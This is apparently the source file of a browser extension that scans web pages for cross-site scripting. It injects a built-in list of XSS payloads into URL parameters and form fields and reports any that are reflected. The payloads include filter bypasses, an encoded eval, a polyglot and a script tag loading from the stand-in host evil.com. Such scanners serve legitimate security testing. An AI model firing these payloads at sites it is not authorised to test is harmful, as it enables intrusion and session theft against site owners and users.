/**
 * XSS Scanner Extension for Marshall Browser
 * Detect Cross-Site Scripting vulnerabilities
 * Part of Marshall Extensions Collection
 */

class XSSScanner {
    constructor() {
        this.payloads = [];
        this.results = [];
        this.scanning = false;
        this.loadPayloads();
    }

    loadPayloads() {
        // Basic XSS payloads
        this.payloads = [
            // Script injection
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script src="//evil.com/xss.js"></script>',
            
            // Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            
            // Attribute injection
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            
            // URL-based
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            
            // Encoded payloads
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
            
            // DOM-based
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<svg/onload=alert(String.fromCharCode(88,83,83))>',
            
            // Filter bypass
            '<ScRiPt>alert(1)</sCrIpT>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<script>alert(1)//</script>',
            '<img """><script>alert(1)</script>">',
            
            // Polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        ];
    }

    async init() {
        // Load custom payloads from settings
        const customPayloads = await marshall.storage.get('xss_custom_payloads');
        if (customPayloads) {
            const custom = customPayloads.split('\n').filter(p => p.trim());
            this.payloads = [...this.payloads, ...custom];
        }

        // Register toolbar button
        marshall.toolbar.register({
            id: 'xss-scanner',
            icon: '⚡',
            title: 'XSS Scanner',
            onclick: () => this.showPanel()
        });

        // Register keyboard shortcut
        marshall.keyboard.register('Ctrl+Shift+X', () => this.showPanel());

        console.log('[XSS Scanner] Extension initialized');
        return true;
    }

    async scanPage() {
        if (this.scanning) {
            marshall.ui.notify('Scan already in progress', 'warning');
            return;
        }

        this.scanning = true;
        this.results = [];
        
        const tab = await marshall.tabs.getCurrent();
        
        marshall.ui.notify('Starting XSS scan...', 'info');
        this.updatePanel('<div class="scan-progress">🔍 Scanning page...</div>');

        try {
            // Get all forms on the page
            const forms = await marshall.dom.querySelectorAll('form');
            
            // Get all input fields
            const inputs = await marshall.dom.querySelectorAll('input, textarea, select');
            
            // Get URL parameters
            const url = new URL(tab.url);
            const urlParams = Array.from(url.searchParams.keys());

            let totalTests = 0;
            let vulnerabilities = [];

            // Scan URL parameters
            for (const param of urlParams) {
                const paramResults = await this.scanParameter(tab.url, param);
                vulnerabilities = [...vulnerabilities, ...paramResults];
                totalTests += this.payloads.length;
                this.updateProgress(totalTests, vulnerabilities.length);
            }

            // Scan forms
            for (const form of forms) {
                const formResults = await this.scanForm(form);
                vulnerabilities = [...vulnerabilities, ...formResults];
                totalTests += this.payloads.length * (form.inputs?.length || 1);
                this.updateProgress(totalTests, vulnerabilities.length);
            }

            // Scan reflected input in page content
            const reflectedResults = await this.scanReflectedContent(tab);
            vulnerabilities = [...vulnerabilities, ...reflectedResults];

            this.results = vulnerabilities;
            this.showResults();

        } catch (error) {
            console.error('[XSS Scanner] Error:', error);
            marshall.ui.notify('Scan error: ' + error.message, 'error');
        } finally {
            this.scanning = false;
        }
    }

    async scanParameter(baseUrl, param) {
        const vulnerabilities = [];
        const url = new URL(baseUrl);
        const originalValue = url.searchParams.get(param);

        for (const payload of this.payloads.slice(0, 10)) { // Limit for performance
            url.searchParams.set(param, payload);
            
            try {
                const response = await marshall.network.fetch(url.toString(), {
                    credentials: 'include'
                });
                const html = await response.text();

                // Check if payload is reflected
                if (this.isReflected(html, payload)) {
                    vulnerabilities.push({
                        type: 'Reflected XSS',
                        location: 'URL Parameter',
                        parameter: param,
                        payload: payload,
                        url: url.toString(),
                        severity: this.getSeverity(payload, html),
                        evidence: this.extractEvidence(html, payload)
                    });
                    break; // Found vulnerability, move to next parameter
                }
            } catch (error) {
                // Continue with next payload
            }
        }

        // Restore original value
        if (originalValue) {
            url.searchParams.set(param, originalValue);
        }

        return vulnerabilities;
    }

    async scanForm(form) {
        const vulnerabilities = [];
        const inputs = form.inputs || [];
        
        for (const input of inputs) {
            if (input.type === 'hidden' || input.type === 'submit') continue;

            for (const payload of this.payloads.slice(0, 5)) {
                try {
                    // Build form data
                    const formData = new FormData();
                    for (const inp of inputs) {
                        if (inp.name === input.name) {
                            formData.append(inp.name, payload);
                        } else {
                            formData.append(inp.name, inp.value || 'test');
                        }
                    }

                    const method = form.method || 'POST';
                    const action = form.action || window.location.href;

                    const response = await marshall.network.fetch(action, {
                        method: method,
                        body: formData,
                        credentials: 'include'
                    });

                    const html = await response.text();

                    if (this.isReflected(html, payload)) {
                        vulnerabilities.push({
                            type: 'Reflected XSS',
                            location: 'Form Input',
                            form: action,
                            parameter: input.name,
                            payload: payload,
                            severity: this.getSeverity(payload, html),
                            evidence: this.extractEvidence(html, payload)
                        });
                        break;
                    }
                } catch (error) {
                    // Continue
                }
            }
        }

        return vulnerabilities;
    }

    async scanReflectedContent(tab) {
        const vulnerabilities = [];
        
        // Check for DOM-based XSS sources
        const domSources = [
            'document.location',
            'document.URL',
            'document.referrer',
            'window.name',
            'location.hash',
            'location.search'
        ];

        const pageContent = await marshall.dom.getHTML();
        
        for (const source of domSources) {
            const sourceRegex = new RegExp(source.replace('.', '\\.'), 'gi');
            const matches = pageContent.match(sourceRegex);
            
            if (matches) {
                // Check for dangerous sinks
                const sinkPatterns = [
                    /innerHTML\s*=/gi,
                    /outerHTML\s*=/gi,
                    /document\.write/gi,
                    /eval\s*\(/gi,
                    /setTimeout\s*\(/gi,
                    /setInterval\s*\(/gi,
                    /\.html\s*\(/gi  // jQuery
                ];

                for (const sinkPattern of sinkPatterns) {
                    if (sinkPattern.test(pageContent)) {
                        vulnerabilities.push({
                            type: 'DOM-based XSS (Potential)',
                            location: 'JavaScript',
                            source: source,
                            sink: sinkPattern.toString(),
                            severity: 'Medium',
                            evidence: 'Dangerous sink found with user-controllable source'
                        });
                    }
                }
            }
        }

        return vulnerabilities;
    }

    isReflected(html, payload) {
        // Check for exact match
        if (html.includes(payload)) return true;

        // Check for decoded versions
        const decoded = decodeURIComponent(payload);
        if (html.includes(decoded)) return true;

        // Check for HTML entity decoded
        const entityDecoded = this.decodeEntities(payload);
        if (html.includes(entityDecoded)) return true;

        return false;
    }

    decodeEntities(str) {
        const textarea = document.createElement('textarea');
        textarea.innerHTML = str;
        return textarea.value;
    }

    getSeverity(payload, html) {
        // Check if payload executes in dangerous context
        const criticalPatterns = [
            /<script[^>]*>[^<]*<\/script>/gi,
            /on\w+\s*=\s*["'][^"']*alert/gi,
            /javascript:/gi
        ];

        for (const pattern of criticalPatterns) {
            if (pattern.test(html)) {
                return 'Critical';
            }
        }

        // Check if in attribute context
        if (html.includes(`"${payload}"`) || html.includes(`'${payload}'`)) {
            return 'High';
        }

        return 'Medium';
    }

    extractEvidence(html, payload) {
        const index = html.indexOf(payload);
        if (index === -1) return 'Payload reflected in response';

        const start = Math.max(0, index - 50);
        const end = Math.min(html.length, index + payload.length + 50);
        
        return '...' + html.substring(start, end) + '...';
    }

    updateProgress(tests, vulns) {
        this.updatePanel(`
            <div class="scan-progress">
                <div class="progress-bar">
                    <div class="progress-fill" style="width: ${Math.min(100, tests / 10)}%"></div>
                </div>
                <p>Tests: ${tests} | Vulnerabilities: ${vulns}</p>
            </div>
        `);
    }

    showResults() {
        if (this.results.length === 0) {
            this.updatePanel(`
                <div class="scan-complete">
                    <h3>✅ Scan Complete</h3>
                    <p>No XSS vulnerabilities detected.</p>
                    <p class="note">Note: This doesn't guarantee the application is secure.
                    Manual testing is recommended.</p>
                </div>
            `);
            return;
        }

        const html = `
            <div class="scan-results">
                <h3>⚠️ ${this.results.length} Vulnerabilities Found</h3>
                
                ${this.results.map((vuln, i) => `
                    <div class="vuln-item ${vuln.severity.toLowerCase()}">
                        <div class="vuln-header">
                            <span class="vuln-type">${vuln.type}</span>
                            <span class="vuln-severity">${vuln.severity}</span>
                        </div>
                        <div class="vuln-details">
                            <p><strong>Location:</strong> ${vuln.location}</p>
                            <p><strong>Parameter:</strong> ${vuln.parameter || 'N/A'}</p>
                            <p><strong>Payload:</strong> <code>${this.escapeHtml(vuln.payload || '')}</code></p>
                            <p><strong>Evidence:</strong></p>
                            <pre>${this.escapeHtml(vuln.evidence || '')}</pre>
                        </div>
                    </div>
                `).join('')}
                
                <div class="scan-actions">
                    <button onclick="xssScanner.exportResults()">Export Report</button>
                    <button onclick="xssScanner.scanPage()">Scan Again</button>
                </div>
            </div>
        `;

        this.updatePanel(html);
    }

    escapeHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    showPanel() {
        const html = `
            <div class="xss-scanner-panel">
                <h2>⚡ XSS Scanner</h2>
                <p>Scan the current page for Cross-Site Scripting vulnerabilities.</p>
                
                <div class="scan-options">
                    <label>
                        <input type="checkbox" id="aggressive-mode"> Aggressive Mode
                    </label>
                </div>
                
                <div class="scan-buttons">
                    <button class="primary" onclick="xssScanner.scanPage()">Start Scan</button>
                    <button onclick="xssScanner.quickScan()">Quick Scan</button>
                </div>
                
                <div class="scan-output" id="scan-output">
                    <p class="placeholder">Click "Start Scan" to begin...</p>
                </div>
                
                <div class="disclaimer">
                    <small>⚠️ Only use on systems you have permission to test.</small>
                </div>
            </div>
        `;

        marshall.ui.showPanel(html, {
            title: 'XSS Scanner',
            width: 500,
            height: 600
        });
    }

    updatePanel(content) {
        marshall.dom.setHTML('#scan-output', content);
    }

    async quickScan() {
        // Quick scan only checks URL parameters
        const tab = await marshall.tabs.getCurrent();
        const url = new URL(tab.url);
        const params = Array.from(url.searchParams.keys());

        if (params.length === 0) {
            marshall.ui.notify('No URL parameters found to test', 'info');
            return;
        }

        this.scanning = true;
        this.results = [];
        
        for (const param of params) {
            const results = await this.scanParameter(tab.url, param);
            this.results = [...this.results, ...results];
        }

        this.scanning = false;
        this.showResults();
    }

    exportResults() {
        const report = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            vulnerabilities: this.results,
            summary: {
                total: this.results.length,
                critical: this.results.filter(v => v.severity === 'Critical').length,
                high: this.results.filter(v => v.severity === 'High').length,
                medium: this.results.filter(v => v.severity === 'Medium').length
            }
        };

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        
        marshall.downloads.start({
            url: url,
            filename: `xss-scan-${Date.now()}.json`
        });
    }
}

// Extension entry point
const xssScanner = new XSSScanner();

marshall.extension.onActivate(async () => {
    await xssScanner.init();
});

marshall.extension.onDeactivate(() => {
    console.log('[XSS Scanner] Extension deactivated');
});

// Export for API access
marshall.extension.export('scan', () => xssScanner.scanPage());
marshall.extension.export('results', () => xssScanner.results);
